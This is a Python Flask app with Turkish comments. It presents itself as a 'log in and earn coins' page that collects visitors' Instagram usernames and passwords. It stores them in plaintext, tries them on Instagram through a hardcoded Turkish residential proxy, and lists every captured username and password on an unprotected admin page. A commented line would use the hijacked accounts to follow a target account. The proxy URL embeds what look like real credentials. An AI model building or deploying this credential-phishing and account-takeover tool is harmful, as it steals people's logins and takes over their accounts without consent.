import os
import threading
import time
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///test.db")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# PROXY - TÜRKİYE (TR) LOKASYONLU TAM URL
PROXY_URL = "http://pcUjiruWbB-res-tr:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"

class IGUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    status = db.Column(db.String(100), default="Bekliyor")

# ANINDA GİRİŞ DENEME MOTORU
def instant_login(username, password):
    with app.app_context():
        user = IGUser.query.filter_by(username=username).first()
        cl = Client()
        try:
            # 1. AYARLAR (Yıldırım Hızı)
            cl.set_proxy(PROXY_URL)
            cl.request_timeout = 5 # Sadece 5 saniye bekle, takılı kalma!
            cl.set_device_settings({"device_model": "iPhone13,2", "locale": "tr_TR"})
            
            # 2. ANINDA GÜNCELLE
            user.status = "DENENİYOR... ⚡"
            db.session.commit()
            
            # 3. GİRİŞ
            if cl.login(username, password):
                user.status = "AKTİF ✅"
                db.session.commit()
                # Takip komutu buraya: cl.user_follow(cl.user_id_from_username("HEDEF"))
            else:
                user.status = "Hatalı Şifre ❌"
                db.session.commit()
        except Exception as e:
            # Hata ne olursa olsun panelde anında gör
            user.status = "Bağlantı/Proxy Hatası ⚠️"
            db.session.commit()

@app.route('/api/start-login', methods=['POST'])
def start_login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    # Veritabanına saniyede kayıt
    user = IGUser.query.filter_by(username=u).first()
    if not user:
        user = IGUser(username=u, password=p); db.session.add(user)
    else:
        user.password, user.status = p, "Başlatıldı 🚀"
    db.session.commit()
    
    # BEKLEME YAPMADAN BAŞLAT
    threading.Thread(target=instant_login, args=(u, p), daemon=True).start()
    return jsonify(status="success", msg="Sistem başlatıldı, 5 saniye sonra paneli yenile!")

@app.route('/')
def home():
    return render_template_string("<h1>Giriş Yap ve Coin Kas</h1><input id='u'><input id='p' type='password'><button onclick='start()'>BAŞLAT</button>")

@app.route('/panel-admin')
def admin():
    users = IGUser.query.order_by(IGUser.id.desc()).all()
    res = "<h2>CANLI TAKİP</h2><table border='1'><tr><th>User</th><th>Pass</th><th>Durum</th></tr>"
    for u in users: res += f"<tr><td>{u.username}</td><td>{u.password}</td><td>{u.status}</td></tr>"
    return res + "</table>"

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
